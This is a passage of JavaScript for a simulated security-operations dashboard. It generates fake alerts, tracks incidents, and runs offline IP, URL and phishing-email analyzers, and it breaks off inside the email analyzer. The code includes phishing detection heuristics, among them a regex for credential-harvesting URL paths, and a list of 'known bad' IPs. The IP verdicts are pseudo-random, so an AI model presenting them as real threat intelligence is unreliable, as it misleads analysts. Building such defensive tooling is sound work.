/* ==========================================================================
   SENTINEL — SOC Console
   Pure vanilla JS. No build step, no dependencies, no backend.

   SAFETY NOTE: Everything in this file is a local simulation or a static,
   offline heuristic analyzer. Nothing here performs real network scanning,
   exploitation, or unauthorized access of any kind. The only code that
   talks to the outside world lives in the "LIVE API" sections, is clearly
   labeled, calls only public read-only threat-intel endpoints with a key
   YOU supply, and is entirely optional.
   ========================================================================== */

(function () {
"use strict";

/* ============================================================
   0. STATE
   ============================================================ */
const State = {
  events: [],          // all simulated security events, newest first
  incidents: [],        // incident records
  paused: false,
  soundOn: true,
  notifPermission: false,
  volumeBuckets: [],    // last 60 one-second buckets of event counts
  eventTypesSeen: new Set(),
  ingestTimestamps: [], // for evt/min calc
  filters: { search: "", severity: "all", type: "all" },
  incidentFilters: { search: "", status: "all" },
  idCounter: 1,
  incidentCounter: 1
};

const SEVERITIES = ["critical", "high", "medium", "low", "info"];
const SEV_WEIGHT = { critical: 4, high: 3, medium: 2, low: 1, info: 0 };

/* ============================================================
   1. UTILITIES
   ============================================================ */
const $ = (sel, root) => (root || document).querySelector(sel);
const $$ = (sel, root) => Array.from((root || document).querySelectorAll(sel));

function pad(n) { return n < 10 ? "0" + n : "" + n; }

function fmtTime(d) {
  return pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
}
function fmtDate(d) {
  const days = ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"];
  const months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
  return days[d.getDay()] + " " + d.getDate() + " " + months[d.getMonth()] + " " + d.getFullYear();
}
function fmtClock(d) {
  return pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
}
function timeAgo(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 5) return "just now";
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  return h + "h ago";
}
function escapeHtml(str) {
  return String(str).replace(/[&<>"']/g, c => ({
    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
  }[c]));
}
function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function pick(arr) { return arr[randInt(0, arr.length - 1)]; }
function uid(prefix) { return prefix + "-" + Math.random().toString(36).slice(2, 8); }

// Deterministic string hash -> 32bit int, used so the same IP/hash/URL
// always yields the same "simulated" verdict rather than a random one.
function hashString(str) {
  let h = 2166136261;
  for (let i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return Math.abs(h);
}
function seededRandom(seed) {
  // mulberry32
  let t = seed += 0x6D2B79F5;
  t = Math.imul(t ^ (t >>> 15), t | 1);
  t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
  return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
}
function downloadJSON(filename, obj) {
  const blob = new Blob([JSON.stringify(obj, null, 2)], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = filename;
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

/* ============================================================
   2. SIMULATED REFERENCE DATA
   ============================================================ */
const EVENT_TYPES = [
  { type: "Brute Force Attempt",        sev: "high",     cat: "auth" },
  { type: "Malware Detected",           sev: "critical", cat: "endpoint" },
  { type: "Ransomware Indicator",       sev: "critical", cat: "endpoint" },
  { type: "Port Scan Detected",         sev: "medium",   cat: "network" },
  { type: "DDoS Traffic Spike",         sev: "high",     cat: "network" },
  { type: "Unauthorized Access",        sev: "critical", cat: "auth" },
  { type: "Data Exfiltration Attempt",  sev: "critical", cat: "network" },
  { type: "Suspicious Login Location",  sev: "medium",   cat: "auth" },
  { type: "Firewall Block",             sev: "low",      cat: "network" },
  { type: "IDS Signature Match",        sev: "high",     cat: "network" },
  { type: "Policy Violation",           sev: "info",     cat: "policy" },
  { type: "Phishing Email Quarantined", sev: "medium",   cat: "email" },
  { type: "Privilege Escalation",       sev: "critical", cat: "endpoint" },
  { type: "New Admin Account Created",  sev: "medium",   cat: "auth" },
  { type: "TLS Certificate Expiry",     sev: "info",     cat: "infra" },
  { type: "Endpoint Agent Heartbeat",   sev: "info",     cat: "infra" },
  { type: "SQL Injection Attempt",      sev: "high",     cat: "network" },
  { type: "Cross-Site Scripting Probe", sev: "medium",   cat: "network" },
  { type: "Impossible Travel Login",    sev: "high",     cat: "auth" },
  { type: "USB Device Connected",       sev: "low",      cat: "endpoint" }
];

const ASSETS = ["SRV-DB01","SRV-DB02","WEB-PROD-01","WEB-PROD-03","APP-GW-02","MAIL-GW-01",
  "DC-CORE-01","VPN-EDGE-02","FW-PERIMETER-01","EP-FIN-0221","EP-HR-0119","EP-ENG-0847",
  "K8S-NODE-07","S3-BACKUP-VAULT","LB-EXT-01","IDS-SENSOR-04"];

const COUNTRIES = ["Russia","China","Iran","North Korea","Brazil","Vietnam","Nigeria","Netherlands",
  "United States","Germany","Ukraine","Romania","India","Indonesia","Unknown / Tor Exit"];

const USERNAMES = ["admin","root","jsmith","finance_svc","backup_admin","svc_deploy","hr_manager","m.chen","a.patel","guest"];

function randomIp() {
  return `${randInt(1,223)}.${randInt(0,255)}.${randInt(0,255)}.${randInt(1,254)}`;
}
// A small pool of "known bad" IPs that recur, so investigations feel consistent.
const KNOWN_BAD_IPS = ["185.220.101.7","45.155.205.19","194.26.29.156","91.240.118.4","203.0.113.55","198.51.100.23"];

function randomSourceIp() {
  return Math.random() < 0.3 ? pick(KNOWN_BAD_IPS) : randomIp();
}

const SYSTEM_SERVICES = [
  { name: "Perimeter Firewall",     detail: "FW-PERIMETER-01" },
  { name: "IDS / IPS Sensor Grid",  detail: "6 sensors" },
  { name: "SIEM Log Collector",     detail: "1.2K events/min avg" },
  { name: "Endpoint Agents",        detail: "482 hosts reporting" },
  { name: "Threat Intel Feed Sync", detail: "external feed" },
  { name: "Email Security Gateway", detail: "MAIL-GW-01" },
  { name: "VPN Concentrator",       detail: "VPN-EDGE-02" },
  { name: "Backup Vault",           detail: "S3-BACKUP-VAULT" }
];
const serviceState = SYSTEM_SERVICES.map(s => ({ ...s, status: "ok", lastCheck: Date.now() }));

/* ============================================================
   3. EVENT GENERATION (SIMULATOR)
   ============================================================ */
function generateEvent() {
  const def = pick(EVENT_TYPES);
  const srcIp = randomSourceIp();
  const asset = pick(ASSETS);
  const user = pick(USERNAMES);
  const country = pick(COUNTRIES);
  const templates = {
    "Brute Force Attempt": `${randInt(5,80)} failed login attempts for user "${user}" from ${srcIp} (${country})`,
    "Malware Detected": `Signature match "Trojan.Generic.${randInt(1000,9999)}" on ${asset}`,
    "Ransomware Indicator": `Mass file rename/encryption pattern detected on ${asset}`,
    "Port Scan Detected": `Sequential connection attempts across ${randInt(15,400)} ports from ${srcIp}`,
    "DDoS Traffic Spike": `Inbound traffic to ${asset} at ${randInt(2,40)}x baseline from ${randInt(50,4000)} sources`,
    "Unauthorized Access": `Access to restricted resource "${asset}" without valid session from ${srcIp}`,
    "Data Exfiltration Attempt": `${randInt(50,900)}MB outbound transfer from ${asset} to ${srcIp} flagged anomalous`,
    "Suspicious Login Location": `Login for "${user}" from unusual location (${country})`,
    "Firewall Block": `Blocked connection ${srcIp} -> ${asset}:${pick([22,3389,443,445,1433,8080])}`,
    "IDS Signature Match": `Snort rule ${randInt(2000000,2099999)} triggered by traffic from ${srcIp}`,
    "Policy Violation": `Unencrypted protocol usage detected on ${asset}`,
    "Phishing Email Quarantined": `Message impersonating internal IT quarantined for ${randInt(1,40)} recipients`,
    "Privilege Escalation": `User "${user}" added to local Administrators group on ${asset}`,
    "New Admin Account Created": `Account "${user}_adm" granted admin rights on ${asset}`,
    "TLS Certificate Expiry": `Certificate for ${asset} expires in ${randInt(1,14)} days`,
    "Endpoint Agent Heartbeat": `Agent check-in from ${asset} nominal`,
    "SQL Injection Attempt": `Payload pattern detected in request to ${asset} from ${srcIp}`,
    "Cross-Site Scripting Probe": `Reflected script payload blocked on ${asset} from ${srcIp}`,
    "Impossible Travel Login": `User "${user}" logins 6200km apart within 4 minutes`,
    "USB Device Connected": `Removable storage connected to ${asset} by "${user}"`
  };
  return {
    id: State.idCounter++,
    ts: Date.now(),
    severity: def.sev,
    type: def.type,
    category: def.cat,
    sourceIp: srcIp,
    destAsset: asset,
    description: templates[def.type] || def.type,
    status: "new"
  };
}

function pushEvent(evt) {
  State.events.unshift(evt);
  if (State.events.length > 500) State.events.length = 500;
  State.eventTypesSeen.add(evt.type);
  State.ingestTimestamps.push(evt.ts);
  const cutoff = Date.now() - 60000;
  State.ingestTimestamps = State.ingestTimestamps.filter(t => t > cutoff);

  KPI.recompute();
  Feed.renderTypeOptions();
  Feed.renderRow(evt, true);

  if (evt.severity === "critical" || evt.severity === "high") {
    Notify.fire(evt);
  }
  if (evt.severity === "critical" && Math.random() < 0.35) {
    // occasionally a critical event auto-opens an incident, like a real SOAR playbook would
    Incidents.createFromEvent(evt, true);
  }
}

let simTimer = null;
function scheduleNextEvent() {
  const delay = randInt(1800, 5200); // every few seconds
  simTimer = setTimeout(() => {
    if (!State.paused) pushEvent(generateEvent());
    scheduleNextEvent();
  }, delay);
}

/* ============================================================
   4. KPI COUNTERS
   ============================================================ */
const KPI = {
  recompute() {
    const counts = { critical: 0, high: 0, medium: 0, lowinfo: 0 };
    for (const e of State.events) {
      if (e.severity === "critical") counts.critical++;
      else if (e.severity === "high") counts.high++;
      else if (e.severity === "medium") counts.medium++;
      else counts.lowinfo++;
    }
    this.setVal("kpiCritical", counts.critical);
    this.setVal("kpiHigh", counts.high);
    this.setVal("kpiMedium", counts.medium);
    this.setVal("kpiLow", counts.lowinfo);
    this.setVal("kpiTotal", State.events.length);
    const openIncidents = State.incidents.filter(i => i.status !== "Resolved").length;
    this.setVal("kpiIncidents", openIncidents);

    $("#criticalBadge").textContent = counts.critical > 99 ? "99+" : counts.critical;
    const navBadge = $("#incidentNavBadge");
    navBadge.textContent = openIncidents;
    navBadge.dataset.zero = openIncidents === 0 ? "true" : "false";

    const rate = State.ingestTimestamps.length; // events in last 60s ~= evt/min
    $("#ingestRate").textContent = rate;

    Charts.updateSeverity(counts);
  },
  setVal(id, val) {
    const el = $("#" + id);
    if (el.textContent !== String(val)) {
      el.textContent = val;
      const card = el.closest(".kpi-card");
      if (card) { card.classList.remove("bump"); void card.offsetWidth; card.classList.add("bump"); }
    }
  }
};

/* ============================================================
   5. LIVE FEED (table + filters)
   ============================================================ */
const Feed = {
  init() {
    $("#feedSearch").addEventListener("input", e => { State.filters.search = e.target.value.toLowerCase(); this.rerender(); });
    $("#feedSeverityFilter").addEventListener("change", e => { State.filters.severity = e.target.value; this.rerender(); });
    $("#feedTypeFilter").addEventListener("change", e => { State.filters.type = e.target.value; this.rerender(); });
    $("#pauseFeedBtn").addEventListener("click", () => {
      State.paused = !State.paused;
      $("#pauseFeedBtn").textContent = State.paused ? "Resume" : "Pause";
      $("#pauseFeedBtn").classList.toggle("btn-outline", State.paused);
    });
  },
  renderTypeOptions() {
    const sel = $("#feedTypeFilter");
    const current = sel.value;
    const existing = new Set(Array.from(sel.options).map(o => o.value));
    for (const t of State.eventTypesSeen) {
      if (!existing.has(t)) {
        const opt = document.createElement("option");
        opt.value = t; opt.textContent = t;
        sel.appendChild(opt);
      }
    }
    sel.value = current;
  },
  matches(evt) {
    const f = State.filters;
    if (f.severity !== "all" && evt.severity !== f.severity) return false;
    if (f.type !== "all" && evt.type !== f.type) return false;
    if (f.search) {
      const hay = (evt.type + " " + evt.sourceIp + " " + evt.destAsset + " " + evt.description).toLowerCase();
      if (!hay.includes(f.search)) return false;
    }
    return true;
  },
  rowHtml(evt) {
    const d = new Date(evt.ts);
    return `<td class="mono">${fmtTime(d)}</td>
      <td><span class="sev-pill sev-${evt.severity}">${evt.severity}</span></td>
      <td>${escapeHtml(evt.type)}</td>
      <td class="mono">${evt.sourceIp}</td>
      <td class="mono">${evt.destAsset}</td>
      <td>${escapeHtml(evt.description)}</td>
      <td><button class="row-esc-btn" data-esc="${evt.id}">Escalate</button></td>`;
  },
  renderRow(evt, prepend) {
    if (!this.matches(evt)) { this.updateEmptyState(); return; }
    const body = $("#feedBody");
    const tr = document.createElement("tr");
    tr.className = "row-new";
    tr.dataset.id = evt.id;
    tr.innerHTML = this.rowHtml(evt);
    if (prepend) body.insertBefore(tr, body.firstChild); else body.appendChild(tr);
    setTimeout(() => tr.classList.remove("row-new"), 1200);
    // trim DOM rows to keep it light
    while (body.children.length > 150) body.removeChild(body.lastChild);
    this.updateEmptyState();
  },
  rerender() {
    const body = $("#feedBody");
    body.innerHTML = "";
    const filtered = State.events.filter(e => this.matches(e)).slice(0, 150);
    body.innerHTML = filtered.map(e => `<tr data-id="${e.id}">${this.rowHtml(e)}</tr>`).join("");
    this.updateEmptyState();
  },
  updateEmptyState() {
    const body = $("#feedBody");
    $("#feedEmpty").style.display = body.children.length === 0 ? "block" : "none";
  }
};

document.addEventListener("click", (e) => {
  const btn = e.target.closest("[data-esc]");
  if (!btn) return;
  const id = Number(btn.dataset.esc);
  const evt = State.events.find(x => x.id === id);
  if (evt) {
    Incidents.createFromEvent(evt, false);
    Toast.info("Incident created from event #" + id);
  }
});

/* ============================================================
   6. CHARTS (hand-rolled canvas, no chart library)
   ============================================================ */
const Charts = {
  volCanvas: null, volCtx: null,
  sevCanvas: null, sevCtx: null,
  volData: new Array(60).fill(0), // seconds buckets

  init() {
    this.volCanvas = $("#volumeChart"); this.volCtx = this.volCanvas.getContext("2d");
    this.sevCanvas = $("#severityChart"); this.sevCtx = this.sevCanvas.getContext("2d");
    this.resize();
    window.addEventListener("resize", () => this.resize());
    setInterval(() => this.tickVolume(), 1000);
  },
  resize() {
    [this.volCanvas, this.sevCanvas].forEach(c => {
      const ratio = window.devicePixelRatio || 1;
      const w = c.clientWidth || c.parentElement.clientWidth;
      const h = c.height || 160;
      c.width = w * ratio; c.height = h * ratio;
      c.getContext("2d").setTransform(ratio, 0, 0, ratio, 0, 0);
    });
    this.drawVolume();
  },
  tickVolume() {
    // count events that happened in the last completed second
    const now = Date.now();
    const count = State.events.filter(e => e.ts > now - 1000).length;
    this.volData.push(count);
    if (this.volData.length > 60) this.volData.shift();
    this.drawVolume();
  },
  drawVolume() {
    const ctx = this.volCtx, c = this.volCanvas;
    const w = c.clientWidth, h = c.clientHeight || 160;
    ctx.clearRect(0, 0, w, h);
    const max = Math.max(4, ...this.volData);
    const pad = 8;
    const stepX = (w - pad * 2) / (this.volData.length - 1);

    // grid
    ctx.strokeStyle = "rgba(255,255,255,0.05)";
    ctx.lineWidth = 1;
    for (let i = 1; i <= 3; i++) {
      const y = pad + (h - pad * 2) * (i / 4);
      ctx.beginPath(); ctx.moveTo(pad, y); ctx.lineTo(w - pad, y); ctx.stroke();
    }

    // area
    const grad = ctx.createLinearGradient(0, 0, 0, h);
    grad.addColorStop(0, "rgba(76,141,255,0.35)");
    grad.addColorStop(1, "rgba(76,141,255,0.02)");
    ctx.beginPath();
    this.volData.forEach((v, i) => {
      const x = pad + i * stepX;
      const y = h - pad - (v / max) * (h - pad * 2);
      i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
    });
    ctx.lineTo(pad + (this.volData.length - 1) * stepX, h - pad);
    ctx.lineTo(pad, h - pad);
    ctx.closePath();
    ctx.fillStyle = grad;
    ctx.fill();

    // line
    ctx.beginPath();
    this.volData.forEach((v, i) => {
      const x = pad + i * stepX;
      const y = h - pad - (v / max) * (h - pad * 2);
      i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
    });
    ctx.strokeStyle = "#4C8DFF";
    ctx.lineWidth = 2;
    ctx.stroke();

    // last point marker
    const lastV = this.volData[this.volData.length - 1];
    const lx = pad + (this.volData.length - 1) * stepX;
    const ly = h - pad - (lastV / max) * (h - pad * 2);
    ctx.beginPath(); ctx.arc(lx, ly, 3.5, 0, Math.PI * 2);
    ctx.fillStyle = "#4C8DFF"; ctx.fill();
  },
  updateSeverity(counts) {
    const ctx = this.sevCtx, c = this.sevCanvas;
    const w = c.clientWidth, h = c.clientHeight || 160;
    ctx.clearRect(0, 0, w, h);
    const data = [
      { label: "Critical", val: counts.critical, color: "#FF3B5C" },
      { label: "High", val: counts.high, color: "#FF8A3D" },
      { label: "Medium", val: counts.medium, color: "#FFD23D" },
      { label: "Low/Info", val: counts.lowinfo, color: "#35D488" }
    ];
    const max = Math.max(1, ...data.map(d => d.val));
    const padL = 68, padR = 16, padTop = 6, padBottom = 6;
    const rowH = (h - padTop - padBottom) / data.length;
    ctx.font = "11px var(--font-ui), sans-serif";
    data.forEach((d, i) => {
      const y = padTop + i * rowH + rowH * 0.28;
      const barW = (w - padL - padR) * (d.val / max);
      ctx.fillStyle = "rgba(255,255,255,0.55)";
      ctx.textAlign = "right";
      ctx.fillText(d.label, padL - 10, y + rowH * 0.44);
      ctx.fillStyle = "rgba(255,255,255,0.06)";
      ctx.fillRect(padL, y, w - padL - padR, rowH * 0.44);
      ctx.fillStyle = d.color;
      ctx.fillRect(padL, y, Math.max(2, barW), rowH * 0.44);
      ctx.fillStyle = "#DCE4EC";
      ctx.textAlign = "left";
      ctx.fillText(String(d.val), padL + Math.max(2, barW) + 8, y + rowH * 0.44 - 3);
    });
  }
};

/* ============================================================
   7. SYSTEM STATUS
   ============================================================ */
const SystemStatus = {
  init() {
    this.renderTopStrip();
    this.renderList();
    setInterval(() => this.tick(), 4000);
  },
  tick() {
    // small chance a service flickers to warn/down then recovers, like real monitoring
    serviceState.forEach(s => {
      const r = Math.random();
      if (s.status === "ok" && r < 0.03) s.status = "warn";
      else if (s.status === "warn" && r < 0.5) s.status = Math.random() < 0.7 ? "ok" : "down";
      else if (s.status === "down" && r < 0.6) s.status = "warn";
      s.lastCheck = Date.now();
    });
    this.renderTopStrip();
    this.renderList();
  },
  renderTopStrip() {
    const strip = $("#statusStrip");
    strip.innerHTML = serviceState.slice(0, 5).map(s =>
      `<span class="status-chip"><span class="status-dot ${s.status}"></span>${s.name}</span>`
    ).join("");
  },
  renderList() {
    const list = $("#systemStatusList");
    list.innerHTML = serviceState.map(s => `
      <div class="status-row">
        <span class="status-dot ${s.status}"></span>
        <span class="status-row-name">${s.name}<br><span class="status-row-meta">${s.detail}</span></span>
        <span class="status-row-state ${s.status}">${s.status === "ok" ? "Operational" : s.status === "warn" ? "Degraded" : "Down"}</span>
      </div>`).join("");
  }
};

/* ============================================================
   8. NOTIFICATIONS / TOASTS / SOUND
   ============================================================ */
const Toast = {
  push(sevClass, title, body) {
    const stack = $("#toastStack");
    const el = document.createElement("div");
    el.className = "toast " + sevClass;
    el.innerHTML = `<div class="toast-top"><span class="toast-title">${title}</span><button class="toast-close">✕</button></div><div class="toast-body">${escapeHtml(body)}</div>`;
    stack.appendChild(el);
    const remove = () => { el.classList.add("toast-out"); setTimeout(() => el.remove(), 250); };
    el.querySelector(".toast-close").addEventListener("click", remove);
    setTimeout(remove, 7000);
  },
  info(msg) { this.push("medium", "Notice", msg); }
};

const Sound = {
  ctx: null,
  ensure() { if (!this.ctx) this.ctx = new (window.AudioContext || window.webkitAudioContext)(); return this.ctx; },
  beep(freq) {
    if (!State.soundOn) return;
    try {
      const ctx = this.ensure();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = "sine"; osc.frequency.value = freq;
      gain.gain.setValueAtTime(0.0001, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.15, ctx.currentTime + 0.01);
      gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.28);
      osc.connect(gain); gain.connect(ctx.destination);
      osc.start(); osc.stop(ctx.currentTime + 0.3);
    } catch (e) { /* audio not available; fail silently */ }
  }
};

const Notify = {
  fire(evt) {
    const bell = $("#alertBellBtn");
    bell.classList.remove("ring"); void bell.offsetWidth; bell.classList.add("ring");
    Toast.push(evt.severity, evt.severity + " · " + evt.type, evt.description);
    if (evt.severity === "critical") {
      Sound.beep(880);
      if (State.notifPermission && document.hidden) {
        try { new Notification("Critical alert: " + evt.type, { body: evt.description }); } catch (e) {}
      }
    } else {
      Sound.beep(520);
    }
  }
};

/* ============================================================
   9. CLOCK
   ============================================================ */
function tickClock() {
  const d = new Date();
  $("#clockTime").textContent = fmtClock(d);
  $("#clockDate").textContent = fmtDate(d);
}

/* ============================================================
   10. NAVIGATION
   ============================================================ */
function initNav() {
  $$(".nav-item").forEach(btn => {
    btn.addEventListener("click", () => {
      $$(".nav-item").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      const tab = btn.dataset.tab;
      $$(".tab-panel").forEach(p => p.classList.remove("active"));
      $("#tab-" + tab).classList.add("active");
      if (tab === "overview") { Charts.resize(); }
    });
  });
}

/* ============================================================
   11. IP INVESTIGATION
   ============================================================ */
const IPTool = {
  analyze(ip) {
    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
      return { error: "Enter a valid IPv4 address, e.g. 185.220.101.7" };
    }
    const seed = hashString(ip);
    const rnd = seededRandom(seed);
    const isKnownBad = KNOWN_BAD_IPS.includes(ip);
    const score = isKnownBad ? randInt(85, 99) : Math.round(rnd * 100);
    const country = COUNTRIES[Math.floor(seededRandom(seed + 1) * COUNTRIES.length)];
    const asn = "AS" + (10000 + Math.floor(seededRandom(seed + 2) * 89999));
    const org = pick(["DigitalOcean LLC","OVH SAS","Hetzner Online","Chinanet","Rostelecom","Bulletproof-Host Ltd","Amazon AWS","Unknown Hosting"]);
    const isTor = seededRandom(seed + 3) < 0.15;
    const openPorts = [21,22,23,25,80,135,139,443,445,1433,3306,3389,8080,8443]
      .filter(() => seededRandom(seed + it()) < 0.35);
    function it(){ it.n = (it.n||0)+1; return it.n*7; }
    const blacklists = ["Spamhaus","AbuseIPDB Community","EmergingThreats","AlienVault OTX","Talos Intelligence"]
      .filter((_, i) => seededRandom(seed + 50 + i) < (score / 130));
    const recentEvents = State.events.filter(e => e.sourceIp === ip).slice(0, 8);

    let verdict = "Clean", verdictClass = "sev-low";
    if (score >= 75) { verdict = "Malicious"; verdictClass = "sev-critical"; }
    else if (score >= 45) { verdict = "Suspicious"; verdictClass = "sev-high"; }
    else if (score >= 20) { verdict = "Low risk"; verdictClass = "sev-medium"; }

    return { ip, score, verdict, verdictClass, country, asn, org, isTor, openPorts, blacklists, recentEvents };
  },
  render(res) {
    const box = $("#ipResult");
    if (res.error) { box.innerHTML = `<div class="finding"><div class="finding-text">${res.error}</div></div>`; return; }
    box.innerHTML = `
      <div class="verdict-card">
        <div class="verdict-score" style="color:${res.score>=75?'var(--crit)':res.score>=45?'var(--high)':res.score>=20?'var(--med)':'var(--low)'}">${res.score}</div>
        <div class="verdict-info">
          <h4><span class="sev-pill ${res.verdictClass}">${res.verdict}</span> &nbsp;${res.ip}</h4>
          <p>Confidence score out of 100, derived from a local simulated reputation model. ${res.isTor ? "Exit node behavior pattern detected." : ""}</p>
        </div>
      </div>
      <div class="detail-grid">
        <div class="detail-cell"><span class="dl">Country</span><span class="dv">${res.country}</span></div>
        <div class="detail-cell"><span class="dl">ASN</span><span class="dv">${res.asn}</span></div>
        <div class="detail-cell"><span class="dl">Organization</span><span class="dv">${res.org}</span></div>
        <div class="detail-cell"><span class="dl">Tor exit node</span><span class="dv">${res.isTor ? "Yes" : "No"}</span></div>
        <div class="detail-cell"><span class="dl">Open ports (simulated scan history)</span><span class="dv">${res.openPorts.length ? res.openPorts.join(", ") : "None observed"}</span></div>
        <div class="detail-cell"><span class="dl">Blacklist matches</span><span class="dv">${res.blacklists.length ? res.blacklists.join(", ") : "None"}</span></div>
      </div>
      <h3 style="font-size:12.5px;color:var(--text-dim);margin-bottom:8px;">Recent activity from this IP in the live feed</h3>
      <div class="finding-list">
        ${res.recentEvents.length ? res.recentEvents.map(e => `
          <div class="finding"><span class="finding-sev sev-pill sev-${e.severity}">${e.severity}</span>
          <div class="finding-text"><b>${escapeHtml(e.type)}</b> — ${escapeHtml(e.description)} <span class="mono">(${timeAgo(e.ts)})</span></div></div>
        `).join("") : `<div class="finding"><div class="finding-text">No recent events from this IP in the current session feed.</div></div>`}
      </div>
      <div class="tool-input-row" style="margin-top:14px;">
        <button class="btn btn-danger btn-sm" id="ipEscBtn">Open incident for this IP</button>
      </div>
    `;
    const escBtn = $("#ipEscBtn");
    if (escBtn) escBtn.addEventListener("click", () => {
      Incidents.create({
        title: `Investigate suspicious IP ${res.ip}`,
        severity: res.score >= 75 ? "Critical" : res.score >= 45 ? "High" : "Medium",
        source: `IP investigation — score ${res.score}/100, ${res.verdict}`
      });
      Toast.info("Incident opened for " + res.ip);
    });
  }
};

/* ============================================================
   12. URL ANALYZER
   ============================================================ */
const SUSPICIOUS_TLDS = [".zip",".mov",".top",".xyz",".ru",".tk",".gq",".men",".click",".loan",".rest"];
const BRAND_KEYWORDS = ["paypal","apple","microsoft","google","bank","amazon","netflix","office365","secure","login","verify","account"];

const URLTool = {
  analyze(raw) {
    let url;
    try { url = new URL(raw.match(/^https?:\/\//i) ? raw : "http://" + raw); }
    catch (e) { return { error: "Could not parse that as a URL. Include a domain, e.g. example.com/path" }; }

    const findings = [];
    let score = 0;
    const host = url.hostname.toLowerCase();

    if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) { findings.push(["high","Uses a raw IP address instead of a domain name."]); score += 25; }
    if (url.protocol !== "https:") { findings.push(["medium","Not served over HTTPS — credentials or data may be unencrypted."]); score += 10; }
    if (host.split(".").length > 4) { findings.push(["medium","Unusually deep subdomain chain (" + host + ")."]); score += 15; }
    if (/xn--/.test(host)) { findings.push(["high","Punycode / internationalized domain — often used to visually spoof brand names."]); score += 25; }
    if (raw.includes("@")) { findings.push(["high","Contains an \"@\" symbol, which can hide the real destination host."]); score += 25; }
    if ((host.match(/-/g) || []).length >= 3) { findings.push(["medium","Domain contains many hyphens, common in lookalike domains."]); score += 10; }
    const tld = "." + host.split(".").pop();
    if (SUSPICIOUS_TLDS.includes(tld)) { findings.push(["medium", `Uses TLD "${tld}", frequently abused for throwaway phishing domains.`]); score += 15; }
    const brandHit = BRAND_KEYWORDS.find(b => host.includes(b));
    if (brandHit && !host.endsWith(brandHit + ".com")) { findings.push(["high", `Domain references brand keyword "${brandHit}" but is not that brand's real domain.`]); score += 20; }
    if (["bit.ly","tinyurl.com","t.co","goo.gl","is.gd","ow.ly"].includes(host)) { findings.push(["medium","URL shortener — real destination is hidden."]); score += 15; }
    if (url.pathname.length > 60) { findings.push(["low","Very long URL path, sometimes used to obscure intent or evade filters."]); score += 5; }
    if (/(login|verify|update|secure|confirm).*(account|password|billing)/i.test(url.pathname + url.search)) {
      findings.push(["medium","Path/query strongly resembles a credential-harvesting landing page."]); score += 15;
    }
    if (findings.length === 0) findings.push(["low","No obvious structural red flags found in this URL."]);

    score = Math.min(100, score);
    let verdict = "Likely safe", verdictClass = "sev-low";
    if (score >= 60) { verdict = "High risk"; verdictClass = "sev-critical"; }
    else if (score >= 35) { verdict = "Suspicious"; verdictClass = "sev-high"; }
    else if (score >= 15) { verdict = "Low risk"; verdictClass = "sev-medium"; }

    return { url: url.href, host, score, verdict, verdictClass, findings, protocol: url.protocol.replace(":",""), path: url.pathname || "/" };
  },
  render(res) {
    const box = $("#urlResult");
    if (res.error) { box.innerHTML = `<div class="finding"><div class="finding-text">${res.error}</div></div>`; return; }
    box.innerHTML = `
      <div class="verdict-card">
        <div class="verdict-score" style="color:${res.score>=60?'var(--crit)':res.score>=35?'var(--high)':res.score>=15?'var(--med)':'var(--low)'}">${res.score}</div>
        <div class="verdict-info">
          <h4><span class="sev-pill ${res.verdictClass}">${res.verdict}</span> &nbsp;<span class="mono">${escapeHtml(res.host)}</span></h4>
          <p>Structural risk score out of 100 based on offline heuristics (protocol, host shape, path patterns).</p>
        </div>
      </div>
      <div class="detail-grid">
        <div class="detail-cell"><span class="dl">Full URL</span><span class="dv">${escapeHtml(res.url)}</span></div>
        <div class="detail-cell"><span class="dl">Protocol</span><span class="dv">${res.protocol}</span></div>
        <div class="detail-cell"><span class="dl">Path</span><span class="dv">${escapeHtml(res.path)}</span></div>
      </div>
      <div class="finding-list">
        ${res.findings.map(([sev,text]) => `<div class="finding"><span class="finding-sev sev-pill sev-${sev}">${sev}</span><div class="finding-text">${text}</div></div>`).join("")}
      </div>
      <div class="tool-input-row" style="margin-top:14px;">
        <button class="btn btn-danger btn-sm" id="urlEscBtn">Open incident for this URL</button>
      </div>`;
    const escBtn = $("#urlEscBtn");
    if (escBtn) escBtn.addEventListener("click", () => {
      Incidents.create({ title: `Review suspicious URL ${res.host}`, severity: res.score>=60?"Critical":res.score>=35?"High":"Medium", source: `URL analyzer — score ${res.score}/100` });
      Toast.info("Incident opened for " + res.host);
    });
  }
};

/* ============================================================
   13. PHISHING EMAIL ANALYZER
   ============================================================ */
const EmailTool = {
  analyze(raw) {
    if (!raw.trim()) return { error: "Paste an email (headers and/or body) to analyze." };
    const findings = [];
    let score = 0;
    const fromMatch = raw.match(/From:\s*(.+)/i);
    const from = fromMatch ? fromMatch[1].trim() : "";
    const replyToMatch = raw.match(/Reply-To:\s*(.+)/i);
    const subjectMatch = raw.match(/Subject:\s*(.+)/i);
    const subject = subjectMatch ? subjectMatch[1].trim() : "";

    const displayName = (from.match(/^"?([^"<]+)"?\s*</) || [,""])[1].trim();
    const fromAddr = (from.match(/<([^>]+)>/) || [,from])[1].trim();
    const fromDomain = (fromAddr.split("@")[1] || "").toLowerCase();

    if (displayName && BRAND_KEYWORDS.some(b => displayName.toLowerCase().includes(b)) &&
